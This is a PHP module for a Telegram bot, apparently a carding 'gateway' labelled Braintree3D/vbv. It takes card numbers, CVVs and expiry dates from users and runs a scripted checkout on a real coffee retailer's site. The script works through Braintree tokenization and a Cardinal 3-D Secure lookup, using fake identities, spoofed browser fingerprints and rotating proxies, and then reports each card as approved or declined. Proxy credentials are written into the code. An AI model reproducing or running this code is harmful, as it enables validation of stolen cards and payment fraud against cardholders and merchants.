<?php

require __DIR__ . "/../Class/Capsolver/autoload.php";


$gatewayname="vbv";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Braintree3D (".'$vbv'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 

 $response = CurlX::Post(
    "https://www.caffeborbone.com/on/demandware.store/Sites-caffeborbone-eu-Site/en_GB/Cart-AddProduct",
    'pid=CREMACAFFEBAILEYS&quantity=1&options=%5B%5D',
    [ 
        'authority: www.caffeborbone.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://www.caffeborbone.com/gb/en/cart',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    $cookie,
    $proxies
);
$response = CurlX::Get(
    "https://www.caffeborbone.com/gb/en/checkout",
    [ 
        'authority: www.caffeborbone.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://www.caffeborbone.com/gb/en/cart',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    $cookie,
    $proxies
); 
file_put_contents("response.txt",$response->body);
$crf_token = CurlX::ParseString($response->body,' name="csrf_token" value="','=');
 $bearer = CurlX::ParseString($response->body,'clientToken&quot;:&quot;','&');

 $bearer = json_decode(base64_decode($bearer), true)["authorizationFingerprint"];




 $response = CurlX::Post(
    "https://payments.braintree-api.com/graphql",
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"167f4154-03bb-40f9-bdd6-7e'.rand(1111111,9999999).'ed38"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}',
    [ 
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'authorization: Bearer '.$bearer.'',
        'braintree-version: 2018-05-10',
        'content-type: application/json',
        'origin: https://www.caffeborbone.com',
        'referer: https://www.caffeborbone.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    $cookie,
    $proxies
); 
$jwt_value = CurlX::ParseString($response->body,'{"cardinalAuthenticationJWT":"', '"');

 $response = CurlX::Post(
    "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
    '{"BrowserPayload":{"Order":{"OrderDetails":{},"Consumer":{"BillingAddress":{},"ShippingAddress":{},"Account":{}},"Cart":[],"Token":{},"Authorization":{},"Options":{},"CCAExtension":{}},"SupportsAlternativePayments":{"cca":true,"hostedFields":false,"applepay":false,"discoverwallet":false,"wallet":false,"paypal":false,"visacheckout":false}},"Client":{"Agent":"SongbirdJS","Version":"1.35.0"},"ConsumerSessionId":"","ServerJWT":"'.$jwt_value.'"}',
    [ 
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/json;charset=UTF-8',
        'origin: https://www.caffeborbone.com',
        'referer: https://www.caffeborbone.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-cardinal-tid: Tid-08d8de76-6f6a-4622-9a06-9d231ab8a9f1',
    ],
    $cookie,
    $proxies
); 
$jwt_value = CurlX::ParseString($response->body,'"CardinalJWT":"', '"');

$decode = base64_decode($jwt_value);
$decode = CurlX::ParseString($decode,'"ReferenceId":"', '"');

 $response = CurlX::Post(
    "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
    '{"Cookies":{"Legacy":false,"LocalStorage":true,"SessionStorage":true},"DeviceChannel":"Browser","Extended":{"Browser":{"Adblock":true,"AvailableJsFonts":[],"DoNotTrack":"unknown","JavaEnabled":false},"Device":{"ColorDepth":24,"Cpu":"unknown","Platform":"Win32","TouchSupport":{"MaxTouchPoints":0,"OnTouchStartAvailable":false,"TouchEventCreationSuccessful":false}}},"Fingerprint":"17638dd680243c2897bd3d134e708973","FingerprintingTime":617,"FingerprintDetails":{"Version":"1.5.1"},"Language":"es-ES","Latitude":null,"Longitude":null,"OrgUnitId":"61852378d8d298532b33b84e","Origin":"Songbird","Plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"ReferenceId":"'.$decode.'","Referrer":"https://www.caffeborbone.com/","Screen":{"FakedResolution":false,"Ratio":1.6,"Resolution":"1920x1200","UsableResolution":"1920x1152","CCAScreenSize":"02"},"CallSignEnabled":null,"ThreatMetrixEnabled":false,"ThreatMetrixEventType":"PAYMENT","ThreatMetrixAlias":"Default","TimeOffset":360,"UserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","UserAgentDetails":{"FakedOS":false,"FakedBrowser":false},"BinSessionId":"f665e47e-afeb-4dae-963d-cef13517941d"}',
    [ 
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/json',
        'origin: https://geo.cardinalcommerce.com',
        'referer: https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=61852378d8d298532b33b84e&tmEventType=PAYMENT&referenceId=0_db95c7ec-e578-46f3-a248-b70450732acf&geolocation=false&origin=Songbird',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
    ],
    $cookie,
    $proxies
); 
 $response = CurlX::Post(
    "https://www.caffeborbone.com/on/demandware.store/Sites-caffeborbone-eu-Site/en_GB/CheckoutServices-SubmitCustomer",
    'dwfrm_coCustomer_email='.urlencode($email).'&csrf_token='.$crf_token.'%3D',
    [ 
        'authority: www.caffeborbone.com',
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.caffeborbone.com',
        'referer: https://www.caffeborbone.com/gb/en/checkout?stage=customer',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
    ],
    $cookie,
    $proxies
); 

 $result=json_decode($response->body,true);
$uuid=$result["order"]["items"]["items"][0]["UUID"];

 $response = CurlX::Post(
    "https://www.caffeborbone.com/on/demandware.store/Sites-caffeborbone-eu-Site/en_GB/CheckoutShippingServices-SubmitShipping",
    'originalShipmentUUID='.$uuid.'&shipmentUUID='.$uuid.'&shipmentSelector=new&dwfrm_shipping_shippingAddress_addressFields_firstName=Angelo&dwfrm_shipping_shippingAddress_addressFields_lastName=Garc%C3%ADa+torres&dwfrm_shipping_shippingAddress_addressFields_address1=1070&dwfrm_shipping_shippingAddress_addressFields_address2=1070&dwfrm_shipping_shippingAddress_addressFields_country=GB&dwfrm_shipping_shippingAddress_addressFields_city=Zulia%2C+maracaibo&dwfrm_shipping_shippingAddress_addressFields_postalCode=CF37+5EF&dwfrm_shipping_shippingAddress_addressFields_prefix_phonePrefix=%2B44&dwfrm_shipping_shippingAddress_addressFields_phone=04125594378&dwfrm_shipping_shippingAddress_shippingMethodID=standard_eur&dwfrm_shipping_shippingAddress_giftMessage=&csrf_token='.$crf_token.'%3D',
    [ 
        'authority: www.caffeborbone.com',
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.caffeborbone.com',
        'referer: https://www.caffeborbone.com/gb/en/checkout?stage=shipping',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
    ],
    $cookie,
    $proxies
); 
 $response = CurlX::Post(
    "https://payments.braintree-api.com/graphql",
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"167f4154-03bb-40f9-bdd6-7e'.rand(1111111,9999999).'ed38"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    [ 
        'authority: payments.braintree-api.com',
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'authorization: Bearer '.$bearer.'',
        'braintree-version: 2018-05-10',
        'content-type: application/json',
        'origin: https://assets.braintreegateway.com',
        'referer: https://assets.braintreegateway.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    $cookie,
    $proxies
); 

 $tokk = CurlX::ParseString($response->body,'"token":"','"');
$bin = CurlX::ParseString($response->body,'"bin":"','"');

 $response = CurlX::Post(
    'https://api.braintreegateway.com/merchants/nyhdvkbkg75f73gp/client_api/v1/payment_methods/'.$tokk.'/three_d_secure/lookup',
   "{\"amount\":12,\"additionalInfo\":{\"workPhoneNumber\":\"4125004378\",\"shippingGivenName\":\"Angelo García\",\"shippingSurname\":\"torres\",\"shippingPhone\":\"4125004378\",\"billingLine1\":\"1070\",\"billingLine2\":\"1070\",\"billingCity\":\"Zulia%2C%20maracaibo\",\"billingPostalCode\":\"CF37%205EF\",\"billingCountryCode\":\"GB\",\"billingPhoneNumber\":\"04125594378\",\"billingGivenName\":\"Angelo\",\"billingSurname\":\"Garc%C3%ADa%20torres\",\"shippingLine1\":\"1070\",\"shippingLine2\":\"1070\",\"shippingCity\":\"Zulia, maracaibo\",\"shippingState\":\"\",\"shippingPostalCode\":\"CF37 5EF\",\"shippingCountryCode\":\"GB\"},\"bin\":\"".$bin."\",\"dfReferenceId\":\"".$decode."\",\"clientMetadata\":{\"requestedThreeDSecureVersion\":\"2\",\"sdkVersion\":\"web/3.69.0\",\"cardinalDeviceDataCollectionTimeElapsed\":12,\"issuerDeviceDataCollectionTimeElapsed\":11376,\"issuerDeviceDataCollectionResult\":true},\"authorizationFingerprint\":\"".$bearer."\",\"braintreeLibraryVersion\":\"braintree/web/3.69.0\",\"_meta\":{\"merchantAppId\":\"www.caffeborbone.com\",\"platform\":\"web\",\"sdkVersion\":\"3.69.0\",\"source\":\"client\",\"integration\":\"custom\",\"integrationType\":\"custom\",\"sessionId\":\"167f4154-03bb-40f9-bdd6-7e".rand(1111111,9999999)."ed38\"}}",
    [ 
        'authority: api.braintreegateway.com',
        'accept: */*',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/json',
        'origin: https://www.caffeborbone.com',
        'referer: https://www.caffeborbone.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    $cookie,
    $proxies
); 

 $errormessage = CurlX::ParseString($response->body,'"status":"','",');
if(strpos($response->body,"Unsupported card type")){
    $errormessage="Unsupported card type";
}

 //==================[Manejo de los mensajes]======================//
 $errormessage = CurlX::ParseString($response->body,'"status":"','",');
if(strpos($response->body,"Unsupported card type")){
    $errormessage="Unsupported card type";
}
$errormessage=trim($errormessage);
if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage == "authenticate_attempt_successful"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "Card Issuer Declined CVV",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "authenticate_successful"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }

 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
